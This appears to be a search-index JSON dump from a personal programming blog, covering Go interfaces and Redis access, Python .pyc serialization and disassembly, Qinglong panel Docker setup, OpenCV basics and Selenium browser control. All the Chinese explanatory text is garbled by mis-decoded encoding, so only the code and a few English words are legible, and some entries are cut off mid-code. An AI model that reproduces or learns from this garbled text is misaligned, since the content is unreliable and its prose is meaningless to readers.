æ¥å£å˜é‡èµ‹å€¼ä¹Ÿå«å®ç°ç»“æ„ä½“ Myworker.Work() //è°ƒç”¨æ¥å£æ–¹æ³• o.Work() } æ¥å£çš„åµŒå¥— package main import ( \"fmt\" ) // Worker æ¥å£å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³• Work type Worker interface { Work() } type Moyuer interface { Moyu() } type Peoler interface { Worker Moyuer } type Computer struct { something string } func (c *Computer) Work() { fmt.Printf(\"%séƒ½è¦å·¥ä½œ\\n\", c.something) } func (c *Computer) Moyu() { fmt.Printf(\"%sä¹Ÿè¦æ‘¸é±¼\\n\", c.something) } func main() { sth := Computer{something: \"ç¨‹åºå‘˜\"} x := \u0026sth x.Work() x.Moyu() } ç©ºæ¥å£ ä¿¡æ¯ ç©ºæ¥å£ç±»å‹çš„å˜é‡å¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„å˜é‡ã€‚ package main import ( \"fmt\" ) func main() { var x interface{} v1 := \"ç¨‹åºçŒ¿\" v2 := 200 v3 := true x = v1 fmt.Printf(\"%Tç±»å‹ : %v\\n\", x, x) x = v2 fmt.Printf(\"%Tç±»å‹ : %v\\n\", x, x) x = v3 fmt.Printf(\"%Tç±»å‹ : %v\\n\", x, x) } ä¿¡æ¯ å› ä¸ºå¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠä»–å½“åšæ–¹æ³•ä¸­çš„å‚æ•°ä½¿ç”¨ã€‚ package main import ( \"fmt\" ) func test(w interface{}) { fmt.Printf(\"Hello %s\", w) } func main() { words := \"Golang\" test(words) } //Hello Golang ç±»å‹æ–­è¨€ ä¿¡æ¯ ç±»å‹æ–­è¨€çš„ä½œç”¨å°±æ˜¯åˆ¤æ–­ç©ºæ¥å£çš„å€¼å’Œå€¼çš„ç±»å‹ package main import ( \"fmt\" ) func main() { var words interface{} = \"Golang\" switch value := words.(type) { //è¯­æ³•æ ¼å¼ä¸ºï¼šx.(T) case string: fmt.Printf(\"Stringç±»å‹ï¼Œå€¼ä¸º%v\", value) case int: fmt.Printf(\"Intç±»å‹ï¼Œå€¼ä¸º%v\", value) case bool: fmt.Printf(\"Boolç±»å‹ï¼Œå€¼ä¸º%v\", value) } } æ“ä½œredis package main import ( \"context\" \"fmt\" \"os\" \"time\" \"github.com/redis/go-redis/v9\" ) func string(ctx context.Context, client *redis.Client) { key := \"test\" value := \"test_v\" err := client.Set(ctx, key, value, time.Second*1).Err() //å†™_ttlä¸º1ç§’ checkError(err) time.Sleep(time.Second * 2) v2, err := client.Get(ctx, key).Result() //è¯» checkError(err) fmt.Println(v2) client.Del(ctx, key) } func main() { cilent := redis.NewClient(\u0026redis.Options{ Addr: \"localhost:6379\", Password: \"123456\", DB: 0, }) ctx := context.TODO() string(ctx, cilent) } func checkError(err error) { { if err != nil { if err == r","date":"2024-06-18","objectID":"/posts/golang%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Golang"],"title":"goåŸºç¡€å­¦ä¹ ç¬”è®°","uri":"/posts/golang%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"'s friends","date":"2024-05-23","objectID":"/friends/","tags":null,"title":"äº’è”ç½‘çš„æœ‹å‹ä»¬","uri":"/friends/"},{"categories":null,"content":" Base info - nickname: Scan's Blog avatar: https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/logo.png url: https://www.scan.work/ description: Scan's Blog Friendly Reminder Notice 1.å¦‚æœæ‚¨æƒ³äº¤æ¢é“¾æ¥ï¼Œè¯·æŒ‰ä»¥ä¸Šæ ¼å¼ç•™è¨€ã€‚ï¼ˆä»…é™ä¸ªäººéå•†ä¸šåšå®¢/ç½‘ç«™ï¼‰ 2.ç½‘ç«™æ•…éšœã€åœæ­¢ç»´æŠ¤å’Œä¸å½“å†…å®¹å¯èƒ½ä¼šè¢«å–æ¶ˆé“¾æ¥ï¼ 3.é‚£äº›ä¸å°Šé‡ä»–äººåŠ³åŠ¨æˆæœã€æ— æ¥æºè½¬è½½æˆ–æ¶æ„è¡Œä¸ºçš„ç½‘ç«™ï¼Œè¯·ä¸è¦å‰æ¥äº¤æµã€‚ ","date":"2024-05-23","objectID":"/friends/:0:0","tags":null,"title":"äº’è”ç½‘çš„æœ‹å‹ä»¬","uri":"/friends/"},{"categories":["Python","åŠ å¯†ä¸è§£å¯†"],"content":"åºåˆ—åŒ–æ··æ·†å‹ç¼©ã€ååºåˆ—åŒ–æ“ä½œå­¦ä¹ è®°å½•","date":"2024-05-15","objectID":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":["åŠ å¯†ä¸è§£å¯†","åºåˆ—åŒ–"],"title":"Pythonä»£ç åºåˆ—åŒ–æ··æ·†å‹ç¼©å­¦ä¹ è®°å½•","uri":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["Python","åŠ å¯†ä¸è§£å¯†"],"content":"Pythonä»£ç åºåˆ—åŒ–æ··æ·†å‹ç¼©å­¦ä¹ è®°å½• ä¸€ã€äº†è§£Pycæ–‡ä»¶ 1. Pyc æ–‡ä»¶çš„ä½œç”¨ï¼š åŠ è½½çš„é€Ÿåº¦æé«˜ã€æ€§èƒ½æé«˜ã€æ–‡ä»¶ ä¿æŒåŠ å¯†çš„çŠ¶æ€ï¼Œé˜²æ­¢æºç æ³„éœ² ä¸åŒç‰ˆæœ¬ç¼–è¯‘åçš„pycæ–‡ä»¶æ˜¯ä¸åŒçš„ï¼Œä¸åŒç‰ˆæœ¬ä¸èƒ½æ”¾åœ¨ä¸€èµ·è¿è¡Œ Pycæ–‡ä»¶ç»“æ„ï¼š 2. Pyc ç”Ÿæˆçš„æ–¹æ³•ï¼š è‡ªåŠ¨åŒ–ç”Ÿæˆï¼špyæ–‡ä»¶é‡Œåªè¦åŒ…å«importï¼Œå°±ä¼šè‡ªåŠ¨ç”Ÿæˆåœ¨__pycache__ç›®å½•ä¸‹ï¼Œå«ç‰ˆæœ¬å· ä½¿ç”¨ç”Ÿæˆå‡½æ•° py_complie.complie(\"demo.py\") æ–‡ä»¶å¤¹ä¸‹çš„Pyæ–‡ä»¶ç¼–è¯‘ä¸ºPycæ–‡ä»¶ä½¿ç”¨å‡½æ•°ï¼š compileall.compile_dir(r'è·¯å¾„) é€šè¿‡ Python Shell å‘½ä»¤ç”Ÿæˆ python3 -m py_compile md5.py python3 -O -m py_compile md5.py äºŒ ã€æ··æ·†ä¸ååºåˆ—åŒ–Pycæ–‡ä»¶ 1. Pyc æ··æ·†çš„æ–¹æ³•ï¼š pyc = Path(\"__pycache__/demo.cpython-311.pyc\").read_bytes() # æ˜¾ç¤º pyc æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ magic = pyc[:4] zero = pyc[4:8] timestamp = pyc[8:12] size = pyc[12:16] # ä»¥ 16 è¿›åˆ¶æ˜¾ç¤º print('pythons3.11 magic:', bytes(magic).hex(sep=' ').upper()) print('zero:', zero) print('timestamp:', struct.unpack('\u003cI', timestamp)[0]) print('size:', struct.unpack('\u003cI', size)[0]) # åŠ è½½ pyc æ–‡ä»¶ä¸­çš„ Python å¯¹è±¡ pyobj = marshal.loads(pyc[16:]) # å‹ç¼© pyc æ–‡ä»¶ä¸­çš„ Python å¯¹è±¡ print(zlib.compress(marshal.dumps(pyobj))) # æ‰§è¡Œ pyc æ–‡ä»¶ä¸­çš„ Python å¯¹è±¡ exec(pyobj) 2. Pyc ååºåˆ—åŒ–è¿˜åŸæ“ä½œï¼š # é€šè¿‡ code object ç”Ÿæˆ pyc HEADER = magic + b\"\\x00\" * 4 # æ—¶é—´éšä¾¿å†™ HEADER += struct.pack(\"\u003cI\", int(time.time())) # å¤§å°éšä¾¿å†™ HEADER += struct.pack(\"\u003cI\", 30) code = HEADER + marshal.dumps('ä»£ç ') Path('test.pyc').write_bytes(code) #ç”Ÿæˆpycä¹‹ååœ¨ç»ˆç«¯cmdè¿è¡Œ .\\pycdc.exe .\\test.pyc 3. ä½¿ç”¨disæ¨¡å—è¿›è¡ŒæŒ‡ä»¤è¿˜åŸä»£ç ï¼š import dis import sys def disassemble_pyc_file(pyc_file_path): try: with open(pyc_file_path, 'rb') as file: magic = file.read(4) timestamp = file.read(4) size = file.read(4) code_object = file.read() print(\"Disassembling bytecode for:\", pyc_file_path) dis.dis(code_object) except FileNotFoundError: print(\"File not found:\", pyc_file_path) except Exception as e: print(\"An error occurred:\", e) if __name__ == \"__main__\": if len(sys.argv) != 2: print(\"Usage: python disassemble_pyc.py \u003cpyc_file\u003e\") else: pyc_file_path = sys.argv[1] disassemble_pyc_file(pyc_file_path) #ä½¿ç”¨æ–¹æ³•: python disassemble_pyc.py \u003cpyc_file\u003e æ³¨æ„ Pycç”Ÿæˆè¦ä¸åç¼–è¯‘ï¼ˆååºåˆ—åŒ–ï¼‰çš„Pythonç‰ˆæœ¬æ‰€å¯¹åº” ","date":"2024-05-15","objectID":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:0:0","tags":["åŠ å¯†ä¸è§£å¯†","åºåˆ—åŒ–"],"title":"Pythonä»£ç åºåˆ—åŒ–æ··æ·†å‹ç¼©å­¦ä¹ è®°å½•","uri":"/posts/python%E4%BB%A3%E7%A0%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B7%E6%B7%86%E5%8E%8B%E7%BC%A9%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•"],"content":"å®‰è£…ã€ä½¿ç”¨ã€æ‹‰åº“ã€é…ç½®","date":"2024-04-06","objectID":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","tags":["å·¥å…·","é’é¾™é¢æ¿"],"title":"é’é¾™é¢æ¿å­¦ä¹ ç¬”è®°","uri":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•"],"content":" ç³»ç»Ÿç¯å¢ƒï¼šé˜¿é‡Œäº‘LinuxæœåŠ¡å™¨ã€Docker é’é¾™é¢æ¿å­¦ä¹ ç¬”è®° ä½¿ç”¨dockerå®‰è£…é’é¾™é¢æ¿ docker pull whyour/qinglong:latest è¿è¡Œåç›´æ¥å¯åŠ¨ docker run --name qinglong -d \\ -p 5700:5700 \\ -v /opt/ql/data:/ql/data \\ -e QlBaseUrl=\"/\" \\ #è®¾ç½®ç¯å¢ƒå˜é‡ QlBaseUrl å’Œ QlPortï¼Œé’é¾™é¢æ¿æœåŠ¡å¯åŠ¨æ—¶ä½¿ç”¨ -e QlPort=\"5700\" \\ --hostname qinglong \\ #è®¾ç½®å®¹å™¨ä¸»æœºåä¸º qinglong --restart unless-stopped \\ #è®¾ç½®å®¹å™¨éšdockerå¯åŠ¨è‡ªåŠ¨å¯åŠ¨ whyour/qinglong:latest è®¿é—® ip:5700 å¦‚æœå·²ç»åˆ›å»ºå®¹å™¨ï¼Œæ²¡æœ‰éšç€dockerè‡ªåŠ¨å¯åŠ¨çš„è¯å°±è¿è¡Œï¼š docker ps -a docker start [å®¹å™¨åç§°/ID] å¦‚å›¾ï¼š è¿›å…¥å®¹å™¨è¿›è¡Œæ“ä½œ è¿è¡Œå¦‚ä¸‹å‘½ä»¤ docker exec -it [å®¹å™¨å] /bin/bash å‡ºç° å†…ç½®å‘½ä»¤æœ‰(task ql)ï¼š task # ä¾æ¬¡æ‰§è¡Œï¼Œå¦‚æœè®¾ç½®äº†éšæœºå»¶è¿Ÿï¼Œå°†éšæœºå»¶è¿Ÿä¸€å®šç§’æ•° task \u003cfile_path\u003e # ä¾æ¬¡æ‰§è¡Œï¼Œæ— è®ºæ˜¯å¦è®¾ç½®äº†éšæœºå»¶è¿Ÿï¼Œå‡ç«‹å³è¿è¡Œï¼Œå‰å°ä¼šè¾“å‡ºæ—¥ï¼ŒåŒæ—¶è®°å½•åœ¨æ—¥å¿—æ–‡ä»¶ä¸­ task \u003cfile_path\u003e now # å¹¶å‘æ‰§è¡Œï¼Œæ— è®ºæ˜¯å¦è®¾ç½®äº†éšæœºå»¶è¿Ÿï¼Œå‡ç«‹å³è¿è¡Œï¼Œå‰å°ä¸äº§ç”Ÿæ—¥ï¼Œç›´æ¥è®°å½•åœ¨æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œä¸”å¯æŒ‡å®šè´¦å·æ‰§è¡Œ task \u003cfile_path\u003e conc \u003cenv_name\u003e \u003caccount_number\u003e(å¯é€‰çš„) # æŒ‡å®šè´¦å·æ‰§è¡Œï¼Œæ— è®ºæ˜¯å¦è®¾ç½®äº†éšæœºå»¶è¿Ÿï¼Œå‡ç«‹å³è¿è¡Œ task \u003cfile_path\u003e desi \u003cenv_name\u003e \u003caccount_number\u003e # è®¾ç½®ä»»åŠ¡è¶…æ—¶æ—¶é—´ task -m \u003cmax_time\u003e \u003cfile_path\u003e # ä½¿ç”¨ -- åˆ†å‰²ï¼Œ-- åé¢çš„å‚æ•°ä¼šä¼ ç»™è„šæœ¬ï¼Œä¸‹é¢çš„ä¾‹å­ï¼Œè„šæœ¬å°±å¯æ¥æ”¶åˆ°å‚æ•° -u whyour -p password task \u003cfile_path\u003e -- -u whyour -p password ql # æ›´æ–°å¹¶é‡å¯é’é¾™ ql update # è¿è¡Œè‡ªå®šä¹‰è„šæœ¬extra.sh ql extra # æ·»åŠ å•ä¸ªè„šæœ¬æ–‡ä»¶ ql raw \u003cfile_url\u003e # æ·»åŠ å•ä¸ªä»“åº“çš„æŒ‡å®šè„šæœ¬ ql repo \u003crepo_url\u003e \u003cwhitelist\u003e \u003cblacklist\u003e \u003cdependence\u003e \u003cbranch\u003e \u003cextensions\u003e # åˆ é™¤æ—§æ—¥å¿— ql rmlog \u003cdays\u003e # å¯åŠ¨tg-bot ql bot # æ£€æµ‹é’é¾™ç¯å¢ƒå¹¶ä¿®å¤ ql check # é‡ç½®ç™»å½•é”™è¯¯æ¬¡æ•° ql resetlet # ç¦ç”¨ä¸¤æ­¥ç™»å½• ql resettfa more..å¾…å®Œå–„ ","date":"2024-04-06","objectID":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["å·¥å…·","é’é¾™é¢æ¿"],"title":"é’é¾™é¢æ¿å­¦ä¹ ç¬”è®°","uri":"/posts/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["Python","æ·±åº¦å­¦ä¹ "],"content":"å›¾ç‰‡åˆ›å»ºã€ä¿®æ”¹ã€ç¿»è½¬ä¸ç”»çº¿ã€å½¢çŠ¶ã€‚","date":"2023-07-23","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/","tags":["OpenCV","Python","æ·±åº¦å­¦ä¹ "],"title":"OpenCVâ€”â€”åŸºç¡€ç¬”è®°(äºŒ)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Python","æ·±åº¦å­¦ä¹ "],"content":"å›¾ç‰‡ä¿®æ”¹ä¸ç¿»è½¬ ä¿®æ”¹å¤§å° img_size = cv2.resize(img,(1000,300)) #ä¿®æ”¹å¤§å° plt.imshow(img) img_size.shape #æ˜¯ä»¥ å®½ï¼Œé•¿ æ˜¾ç¤ºè€Œä¸æ˜¯é•¿ï¼Œå®½ ç¿»è½¬ # 0 å‚ç›´ç¿»è½¬ 1 æ°´å¹³ç¿»è½¬ -1 æ°´å¹³é”¤ç›´éƒ½ç¿»è½¬ img_flip= cv2.flip(img_fix,å€¼) åˆ›å»ºé»‘è‰²ç”»å¸ƒ img = np.zeros((300, 300, 3), dtype = \"uint8\") pts = np.array([[10, 50], [200, 50], [90, 200]], np.int32) pts = pts.reshape((-1, 1, 2)) åŸºç¡€ç”»çº¿ç”»å›¾ ç”»çº¿ cv2.line(img, (èµ·å§‹ç‚¹), (ç»“æŸç‚¹), (é¢œè‰²), thickness=10) cv2.imshow('çª—å£åç§°', img) cv2.waitKey(0) #æ— é™ç­‰å¾…ï¼ŒæŒ‰ä»»æ„é”®é€€å‡º cv2.destroyAllWindows() #å…³é—­çª—å£ ç”»åœ† cv2.circle(img=img,center=(åœ†å¿ƒçš„åæ ‡),radius=åŠå¾„,color=(0,0,255),thickness=10) #åœ†å¿ƒåæ ‡å…ˆæ˜¯ Yè½´ å†æ˜¯Xè½´ cv2.imshow('çª—å£åç§°', img) cv2.waitKey(0) #æ— é™ç­‰å¾…ï¼ŒæŒ‰ä»»æ„é”®é€€å‡º cv2.destroyAllWindows() #å…³é—­çª—å£ ç”»çŸ©å½¢ / å¤šè¾¹å½¢ çŸ©å½¢ cv2.rectangle(img, (å·¦ä¸Šè§’åæ ‡), (å³ä¸‹è§’åæ ‡), (0, 255, 0), 10) cv2.imshow('çª—å£åç§°', img) cv2.waitKey(0) #æ— é™ç­‰å¾…ï¼ŒæŒ‰ä»»æ„é”®é€€å‡º cv2.destroyAllWindows() #å…³é—­çª—å£ å¤šè¾¹å½¢ï¼ˆä»¥ä¸‰è§’å½¢ä¸ºä¾‹ï¼‰ pts = np.array([[300, 10], [200, 50], [150, 140]], np.int32) #ä¸‰è§’å½¢çš„ä¸‰ä¸ªç‚¹ pts = pts.reshape((-1, 1, 2)) cv2.polylines(img, [pts], True, (0, 255, 0), 3) #Trueçº¿æ¡æ˜¯å¦é—­åˆ ptsä¸ºåˆ—è¡¨ cv2.imshow('çª—å£åç§°', img) cv2.waitKey(0) #æ— é™ç­‰å¾…ï¼ŒæŒ‰ä»»æ„é”®é€€å‡º cv2.destroyAllWindows() #å…³é—­çª—å£ æ³¨æ„ åˆ›å»ºä¸€ä¸ªæ–°çš„å›¾åƒæˆ–è€…è°ƒæ•´å›¾åƒçš„å¤§å°æ—¶ä¸ºï¼ˆYï¼ŒXï¼‰å½¢å¼è¡¨ç¤º å…¶ä½™éƒ½ä¸ºï¼ˆXï¼ŒYï¼‰å½¢å¼è¡¨ç¤º ","date":"2023-07-23","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/:0:0","tags":["OpenCV","Python","æ·±åº¦å­¦ä¹ "],"title":"OpenCVâ€”â€”åŸºç¡€ç¬”è®°(äºŒ)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Python","æ·±åº¦å­¦ä¹ "],"content":"ç†è§£å›¾åƒçš„æœ¬è´¨,å›¾ç‰‡ã€é¢œè‰²é€šé“ã€è½¬åŒ–æ–¹å¼ã€å¤‡ä»½åŸå›¾ã€‚","date":"2023-07-22","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/","tags":["OpenCV","Python","æ·±åº¦å­¦ä¹ "],"title":"OpenCVâ€”â€”åŸºç¡€ç¬”è®°(ä¸€)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Python","æ·±åº¦å­¦ä¹ "],"content":"å¯¼å…¥éœ€è¦çš„åŒ… import numpy as np import matplotlib.pyplot as plt %matplotlib inline ##åµŒå…¥ç”»å›¾åœ¨jupyterä¸­ä½¿ç”¨ï¼Œå¼€å‘å·¥å…·ä¸­å»é™¤ from PIL import Image æµ‹è¯•æ‰“å¼€å›¾ç‰‡ img = Image.open('123.jpeg') img è½¬æ¢ä¸ºNumpyå…ƒç»„ img_1 = np.asanyarray(img) img_1.shape #(960, 720, 3) é•¿ï¼Œå®½ï¼Œ3ä¸ªé¢œè‰²é€šé“åˆ†åˆ«ä¸ºRedã€Greenã€Blue å¤åˆ¶ä¸€ä»½å›¾ç‰‡ img_1_copy = img_1.copy() #ä¿æŒåŸå›¾å¯äºŒæ¬¡ä¿®æ”¹ é¢œè‰²é€šé“ä¿®æ”¹ plt.imshow(img_1_copy[:,:,0]) #å•ç‹¬æ˜¾ç¤ºäº†çº¢è‰²é€šé“ã€‚ img[:,:] = [255, 255, 0] # RGBå€¼(255, 255, 0)ä»£è¡¨é»„è‰²â€”â€”é¢œè‰²çš„æ··åˆ Matplotlibçš„é¢œè‰²æ˜ å°„ Matplotlib æä¾›äº†è®¸å¤šé¢„å®šä¹‰çš„é¢œè‰²æ˜ å°„ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„é¢œè‰²æ˜ å°„ï¼š\r- 'viridis'ï¼šé»˜è®¤çš„é¢œè‰²æ˜ å°„ï¼Œä»æ·±è“è‰²åˆ°é»„è‰²çš„æ¸å˜ã€‚\r- 'plasma'ï¼šä»æ·±ç´«è‰²åˆ°æ©™è‰²çš„æ¸å˜ã€‚\r- 'inferno'ï¼šä»é»‘è‰²åˆ°æ·±çº¢è‰²çš„æ¸å˜ã€‚\r- 'magma'ï¼šä»é»‘è‰²åˆ°ç™½è‰²ï¼Œä¸­é—´åŒ…å«ç´«è‰²å’Œæ©™è‰²çš„æ¸å˜ã€‚\r- 'cividis'ï¼šä»æ·±è“è‰²åˆ°é»„è‰²çš„æ¸å˜ï¼Œè®¾è®¡ç”¨äºè‰²ç›²å‹å¥½ã€‚\r- 'Greys'ï¼šä»é»‘è‰²åˆ°ç™½è‰²çš„ç°åº¦æ¸å˜ã€‚\r- 'Purples'ï¼šä»æµ…ç´«è‰²åˆ°æ·±ç´«è‰²çš„æ¸å˜ã€‚\r- 'Blues'ï¼šä»æµ…è“è‰²åˆ°æ·±è“è‰²çš„æ¸å˜ã€‚\r- 'Greens'ï¼šä»æµ…ç»¿è‰²åˆ°æ·±ç»¿è‰²çš„æ¸å˜ã€‚\r- 'Oranges'ï¼šä»æµ…æ©™è‰²åˆ°æ·±æ©™è‰²çš„æ¸å˜ã€‚\r- 'Reds'ï¼šä»æµ…çº¢è‰²åˆ°æ·±çº¢è‰²çš„æ¸å˜ã€‚å‡ ä¸ªæ —å­ï¼Œå‚è€ƒå‚è€ƒ åŸå›¾ï¼šä¸€åªå°ç›²ä»” Matplotlibçš„imshow()å‡½æ•°æœŸæœ›å›¾åƒæ˜¯RGBæ ¼å¼çš„ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ åœ¨OpenCVä¸­å¤„ç†å›¾åƒï¼ˆå®ƒä½¿ç”¨BGRï¼‰ï¼Œç„¶åæƒ³ç”¨Matplotlibæ˜¾ç¤ºå›¾åƒï¼Œä½ éœ€è¦å°†å…¶ä»BGRè½¬æ¢ä¸ºRGBã€‚ import cv2 from matplotlib import pyplot as plt img_bgr = cv2.imread('image.jpg') img_rgb = cv2.cvtColor(img_bgr, cv2.COLOR_BGR2RGB) plt.imshow(img_rgb) plt.show() #æ˜¾ç¤ºæ‰€æœ‰å·²ç»åˆ›å»ºçš„å›¾åƒ æ³¨æ„ å›¾ä¸Šæ‰€ç¤ºï¼šimg_1_copy[:ï¼Œ:ï¼Œ0]) 0ã€1ã€2 åˆ†åˆ«ä»£è¡¨å›¾åƒçš„æ‰€æœ‰è¡Œæ•°ï¼Œæ‰€æœ‰åˆ—ï¼Œç´¢å¼•å€¼ ç´¢å¼•å€¼è¯´æ˜ï¼š 0ã€1ã€2åˆ†åˆ«å¯¹åº”çº¢ã€ç»¿ã€è“ï¼ˆRGBï¼‰ å¦‚æœä½¿ç”¨OpenCVæ‰“å¼€å°±æ˜¯è“ã€ç»¿ã€çº¢(BGR)ã€‚ ","date":"2023-07-22","objectID":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/:0:0","tags":["OpenCV","Python","æ·±åº¦å­¦ä¹ "],"title":"OpenCVâ€”â€”åŸºç¡€ç¬”è®°(ä¸€)","uri":"/posts/opencv%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Python"],"content":"ä¹¦æ³•æ–‡å­—æ£€æµ‹å½¢æ€å­¦ # æ£€æµ‹ä¹¦æ³•æ–‡å­— æ­¥éª¤ï¼š 1ã€è¯»å–å›¾ç‰‡ï¼Œç°åº¦ã€äºŒå€¼åŒ–å¤„ç† # äºŒå€¼åŒ– # å‚æ•°1ï¼šè¾“å…¥å›¾ç‰‡ # å‚æ•°2ï¼šæ¯”è¾ƒçš„é˜ˆå€¼ # å‚æ•°3ï¼šè¶…å‡ºé˜ˆå€¼è¢«è®¾å®šçš„å€¼ # å‚æ•°4ï¼šæ¨¡å¼ # ä½œç”¨ï¼šå°†ç”»é¢åƒç´ ä¸æ¯”è¾ƒé˜ˆå€¼å¯¹æ¯”ï¼Œå°äºå®ƒåˆ™è®¾ä¸º0ï¼ˆé»‘è‰²ï¼‰ï¼Œå¤§äºå®ƒè®¾ä¸ºç›®æ ‡å€¼ r,black_img = cv2.threshold(gray,100,255,cv2.THRESH_BINARY_INV) plt.imshow(black_img,cmap='gray') è¾¹ç¼˜æ£€æµ‹ #è¾¹ç¼˜æ£€æµ‹ edges = cv2.Canny(å›¾åƒå€¼,30,200) plt.imshow(edges,cmap='gray') 3ã€è†¨èƒ€è¿æ¥ 4ã€é—­åˆå­”æ´ 5ã€è¾¹ç¼˜æ£€æµ‹ 6ã€ç”»æ£€æµ‹æ¡† ","date":"2023-06-06","objectID":"/posts/%E5%BD%A2%E6%80%81%E5%AD%A6%E6%96%B9%E6%B3%95%E6%A3%80%E6%B5%8B/:0:0","tags":["æ·±åº¦å­¦ä¹ ","Python"],"title":"å½¢æ€å­¦æ£€æµ‹æ–¹æ³•","uri":"/posts/%E5%BD%A2%E6%80%81%E5%AD%A6%E6%96%B9%E6%B3%95%E6%A3%80%E6%B5%8B/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•","Python"],"content":"è¿›é˜¶ä½¿ç”¨æ‰§è¡Œï¼šJSä»£ç ï¼Œæ¨¡æ‹ŸæŒ‰é”®ç»„åˆé”®ã€åˆ‡æ¢çª—å£æ€»ç»“ã€‚","date":"2023-06-04","objectID":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/","tags":["å·¥å…·","Python","Selenium"],"title":"Seleniumâ€”â€”è¿›é˜¶ä½¿ç”¨","uri":"/posts/chromedriver%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/"},{"categories":["è‡ªåŠ¨åŒ–æµ‹è¯•","Python"],"content":"æµè§ˆå™¨çš„æ§åˆ¶ driver.set_window_size(å®½ï¼Œé«˜)#è®¾ç½®å®½é«˜ driver.maximize_window()#å…¨å±æ˜¾ç¤º driver.forward() #æµè§ˆå™¨çš„ä¸Šä¸€æ­¥ driver.back() #æµè§ˆå™¨çš„åé€€ driver.refresh() #æµè§ˆå™¨çš„åˆ·æ–° æµè§ˆå™¨çš„çª—å£åˆ‡æ¢ è·å–çª—å£å¥æŸ„ handles=driver.window_handles print(handles) åˆ‡æ¢çª—å£å‘½ä»¤ driver.switch_to.window(handles[0]) handles[0] åˆ‡æ¢åˆ°æœ€å¼€å§‹æ‰“å¼€çš„çª—å£ handles[-1] åˆ‡æ¢åˆ°æœ€æ–°æ‰“å¼€çš„çª—å£ handles[-2] å€’æ•°ç¬¬äºŒä¸ªæ‰“å¼€çš„çª—å£ è¿›é˜¶å§¿åŠ¿ JSä»£ç æ‰§è¡Œ executeScriptæ˜¯åŒæ­¥æ–¹æ³•ï¼Œç”¨å®ƒæ‰§è¡Œjsä»£ç ä¼šé˜»å¡ä¸»çº¿ç¨‹æ‰§è¡Œï¼Œç›´åˆ°jsä»£ç æ‰§è¡Œå®Œæ¯•ï¼› executeAsyncScriptæ–¹æ³•æ˜¯å¼‚æ­¥æ–¹æ³•ï¼Œå®ƒä¸ä¼šé˜»å¡ä¸»çº¿ç¨‹æ‰§è¡Œã€‚ #å€¼å¯å†™å¤šä¸ªJSå˜é‡ execute_script() executeAsyncScript() ä¸Šä¼ æ–‡ä»¶çš„å…ƒç´ æ“ä½œ WebElement adFileUpload =driver.findElement(By.id(\"ä¸Šä¼ \")); String filePath = \"C:\\1.php\";adFileUpload.sendKeys(filePath) éšå¼ç­‰å¾… å¦‚æœåœ¨30ç§’å†…æ‰§è¡Œå°±ç»§ç»­ä¸‹ä¸€æ­¥ï¼Œæ²¡æœ‰æ‰§è¡Œå°±ç­‰å¾…30ç§’ï¼Œ30ç§’å¦‚æœå…ƒç´ è¿˜æœªå‡ºç°åˆ™è·³è¿‡ï¼Œä¸æŠ›å‡ºå¼‚å¸¸ driver.implicitly_wait(30) æ˜¾å¼ç­‰å¾… 